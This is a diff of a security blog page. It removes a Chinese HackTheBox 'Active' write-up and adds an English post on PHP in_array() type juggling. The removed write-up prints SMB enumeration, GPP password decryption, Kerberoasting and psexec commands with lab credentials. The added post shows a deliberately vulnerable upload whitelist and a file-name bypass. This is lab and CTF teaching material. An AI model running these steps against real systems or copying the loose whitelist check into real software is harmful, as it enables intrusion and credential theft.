@@ -18,34 +18,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>HTB Active Writeup | Ikonw&#39;s blog</title>
-  <meta name="description" content="Hackthebox  machine writeup">
+  <title>PHP::in_array() Type Juggling | Ikonw&#39;s blog</title>
+  <meta name="description" content="PHP often known as a ‘loosely typed’ programming language">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB Active Writeup">
-<meta property="og:url" content="https://ik0nw.github.io/2020/02/10/HTB-Active/index.html">
+<meta property="og:title" content="PHP::in_array() Type Juggling">
+<meta property="og:url" content="https://ik0nw.github.io/2020/09/25/PHP::in_array()-Type%20Juggling/index.html">
 <meta property="og:site_name" content="Ikonw&#39;s Blog">
-<meta property="og:description" content="Hackthebox  machine writeup">
+<meta property="og:description" content="PHP often known as a ‘loosely typed’ programming language">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210210254278.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/202002102107263.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210211447140.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/2020021021181611.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210212552448.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210212726788.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210213100537.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210221812462.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/202002102219053.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210222712526.png">
-<meta property="og:image" content="https://ik0nw.github.io/images/root.gif">
-<meta property="article:published_time" content="2020-02-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-09-24T13:37:53.803Z">
+<meta property="article:published_time" content="2020-09-25T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-25T10:07:41.394Z">
 <meta property="article:author" content="Ik0nw">
-<meta property="article:tag" content="hackthebox">
-<meta property="article:tag" content="smb">
+<meta property="article:tag" content="PHP,in_array(),type-juggling">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ik0nw.github.io/images/old-machine-images/20200210210254278.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://ik0nw.github.io/2020/02/10/HTB-Active/index.html">
+  <link rel="canonical" href="https://ik0nw.github.io/2020/09/25/PHP::in_array()-Type%20Juggling/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Ikonw&#39;s Blog" type="application/atom+xml">
   
@@ -339,14 +326,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-HTB-Active" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-PHP::in_array()-Type Juggling" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      HTB Active Writeup
+      PHP::in_array() Type Juggling
     </h1>
   
 
@@ -354,20 +341,20 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/02/10/HTB-Active/" class="article-date">
-	  <time datetime="2020-02-09T16:00:00.000Z" itemprop="datePublished">2020-02-10</time>
+	<a href="/2020/09/25/PHP::in_array()-Type%20Juggling/" class="article-date">
+	  <time datetime="2020-09-25T00:00:00.000Z" itemprop="datePublished">2020-09-25</time>
 	</a>
 </span>
         
   <span class="article-category">
     <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/hackthebox/">hackthebox</a>
+    <a class="article-category-link" href="/categories/php-audit/">php-audit</a>
   </span>
 
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/hackthebox/" rel="tag">hackthebox</a>, <a class="article-tag-link-link" href="/tags/smb/" rel="tag">smb</a>
+	<a class="article-tag-link-link" href="/tags/PHP-in-array-type-juggling/" rel="tag">PHP,in_array(),type-juggling</a>
   </span>
 
 
@@ -380,10 +367,10 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/02/10/HTB-Active/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/09/25/PHP::in_array()-Type%20Juggling/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 810(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 670(words)</span>
 	
 	
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 4(minutes)</span>
@@ -393,53 +380,45 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
-<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210210254278.png" alt="在这里插入图片描述"></p>
-<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>这边我用的是我在OSCP时候用的一个脚本工具（懒惰）</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/old-machine-images/202002102107263.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+        <p>PHP often known as a ‘loosely typed’ programming language</p>
+<a id="more"></a>
 
-<p>除了53和445并没有什么特别能交互的端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-02-10 18:56 +08</span><br><span class="line">Nmap scan report for 10.10.10.100</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88&#x2F;tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-10 10:57:27Z)</span><br><span class="line">135&#x2F;tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp   open  kpasswd5?</span><br><span class="line">593&#x2F;tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp   open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp  open  tcpwrapped</span><br><span class="line">5722&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">9389&#x2F;tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49153&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49154&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49155&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49157&#x2F;tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49169&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49171&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49182&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows_server_2008:r2:sp1, cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 38s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-10T10:58:25</span><br><span class="line">|_  start_date: 2020-02-10T08:17:06</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 194.25 seconds</span><br><span class="line"></span><br><span class="line">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span><br></pre></td></tr></table></figure>
+<p>If we recall in PHP, no data types in any variable have to define. In the circumstance of comparisons of different variable, PHP will automatically convert the data into same data type. </p>
+<p>For example, if we want to compare integer to string. PHP will convert string to integer.<br>Let’s assume a situation. We have a input field asking for the number of bottle.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num_bottles&#x27;</span>]))&#123;</span><br><span class="line">        $num_bottles = $_GET[<span class="string">&#x27;num_bottles&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($num_bottles == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You have order 0 bottles\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num_bottles == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You have order 1 bottles\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num_bottles == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You have order 2 bottles\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($num_bottles))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Please enter only numbers\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Input numbers&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h1 id="一，SMB-ENUMERATION"><a href="#一，SMB-ENUMERATION" class="headerlink" title="一，SMB ENUMERATION"></a>一，SMB ENUMERATION</h1><p>首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>When we try to submit 1 to <code>num_bottles</code>. As we say early on, when comparing string(<code>$_GET[num_bottles] will be string data type</code>) and integer, it will auto convert strings to integer. so it match the first <code>if</code> statement</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/php-audit/day1]</span><br><span class="line">└─<span class="comment"># curl localhost:8080/test.php?num_bottles=1       </span></span><br><span class="line">You have order <span class="number">1</span> bottles</span><br></pre></td></tr></table></figure>
 
-<p>发现对 <strong>Replication</strong> 文件夹 <strong>READ ONLY</strong>权限<br><img src="/images/old-machine-images/20200210211447140.png" alt="在这里插入图片描述"><br>（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。）</p>
-<p>使用 smbclient进行连接 <strong>Replication</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.100\\Replication</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>It seems nothing special that <code>&quot;1&quot; == 1</code><br>What if the user input is “1bottle” ?</p>
+<p>YES, PHP will treat “2bottles” as 2 because of it’s loosely comparison. It will abstract the leading numbers from the beginning of string and convert to integer.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/php-audit/day1]</span><br><span class="line">└─<span class="comment"># curl localhost:8080/test.php?num_bottles=1bottles</span></span><br><span class="line">You have order <span class="number">1</span> bottles</span><br><span class="line">Please enter only numbers</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root💀kali)-[~/Desktop/php-audit/day1]</span><br><span class="line">└─<span class="comment"># curl localhost:8080/test.php?num_bottles=2bottles</span></span><br><span class="line">You have order <span class="number">2</span> bottles</span><br><span class="line">Please enter only numbers</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>发现两个有意思的文件夹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">31B2F340-016D-11D2-945F-00C04FB984F9 是Default admin policy</span><br><span class="line">6AC1786C-016F-11D2-945F-00C04fB984F9 是Default domain polices</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+<p>you might ask, what if there are no numbers?<br>PHP will treat the string as 0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/php-audit/day1]</span><br><span class="line">└─<span class="comment"># curl localhost:8080/test.php?num_bottles=bottles</span></span><br><span class="line">You have order 0 bottles</span><br><span class="line">Please enter only numbers</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/old-machine-images/2020021021181611.png" alt="在这里插入图片描述"><br>如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。<br>经过一番查找<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
-<p>在此目录发现Groups.xml</p>
-<p><img src="/images/old-machine-images/20200210212552448.png" alt="在这里插入图片描述"><br>发现帐号和密码哈希值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">帐号：active.htb\SVC_TGS</span><br><span class="line">哈希值：edBSHOwhZLTjt&#x2F;QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw&#x2F;NglVmQ</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+<h1 id="CTF-Challenge-in-array-type-juggling"><a href="#CTF-Challenge-in-array-type-juggling" class="headerlink" title="CTF Challenge - in_array() type juggling"></a>CTF Challenge - in_array() type juggling</h1><p>CTF challenge from <a target="_blank" rel="noopener" href="https://www.ripstech.com/php-security-calendar-2017/">PHP SECURITY CALENDAR</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">&#x27;./solutions/&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;tmp_name&#x27;</span>],</span><br><span class="line">        <span class="built_in">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">&#x27;solution&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
-<p>可以使用kali自带的gpp-decrypt来破解密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt&#x2F;QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw&#x2F;NglVmQ</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>The have to bypass the restriction of white listing check with the function <code>in_array()</code></p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</p>
+</blockquote>
+<p>Searches for <strong>needle</strong> in <strong>haystack</strong> using loose comparison unless <strong>strict</strong> is set.</p>
+<h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p><strong>neddle</strong> = The Searched Value</p>
+<p><strong>haystack</strong> = The array.</p>
+<p><em>strict</em><br>If the third parameter strict is set to TRUE then the in_array() function will also check the types of the needle in the haystack.</p>
+<p>How <code>in_array()</code> is by comparing a needle to every values in an array. When <code>strict</code> is not set to TRUE, it will not restrict in data types. That’s when PHP loosely comparison come into play.</p>
+<p>if we want to upload a malicious PHP files, the filename has to be end with <code>.php</code> but with the restricted white list, we are only allow to send file in the range of <code>1 - 24</code>.</p>
+<p>We can easily construct a file with leading numbers, will bypass the <code>in_array()</code> check</p>
+<h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>Docker for convenient </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name app8 -d -p 8080:80 -v $(<span class="built_in">pwd</span>):/var/www/app romeoz/docker-apache-php:7.0</span><br></pre></td></tr></table></figure>
 
-<p>得到密码 <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/old-machine-images/20200210212726788.png" alt="在这里插入图片描述"><br>现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>A simple file for uploading</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;day1.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;solution&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/old-machine-images/20200210213100537.png" alt="在这里插入图片描述"><br>发现能读权限能读到user目录里的文件<br>可以用smbclient 进去拿user.txt</p>
-<h1 id="三，ROOT"><a href="#三，ROOT" class="headerlink" title="三，ROOT"></a>三，ROOT</h1><p>之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击</p>
-<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing 攻击</a></p>
-<p>利用 impacket-GetUserSPNs</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;impacket-GetUserSPNs -request active.htb&#x2F;SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 </span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/old-machine-images/20200210221812462.png" alt="在这里插入图片描述"><br>得到hash后 利用john the ripper进行破解<br>得到 Administrator密码为 Ticketmaster1968<br><img src="/images/old-machine-images/202002102219053.png" alt="在这里插入图片描述"></p>
-<p>取到帐号和密码后 我们可以使用 impacket psexec 进行登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;psexec.py active.htb&#x2F;Administrator:Ticketmaster1968@10.10.10.100</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/old-machine-images/20200210222712526.png" alt="在这里插入图片描述"></p>
-<p>成功 拿到Administrator</p>
-<br/>
-<br/>
-<br/>
-
-<p><img src="/images/root.gif" alt="root"></p>
+<p>name the malicious file as <code>1malicious.php</code> will bypass the restriction</p>
+<h1 id="CVE-example"><a href="#CVE-example" class="headerlink" title="CVE example"></a>CVE example</h1><p>TBD</p>
 
       
     </div>
@@ -464,13 +443,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2020/05/12/HTB-cache/" title="HTB Cache Writeup"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2020/02/10/HTB-jeeves/" title="HTB Jeeves Writeup"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/09/23/PHP::Preg_replace()-RCE/" title="PHP::Preg_replace() RCE"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
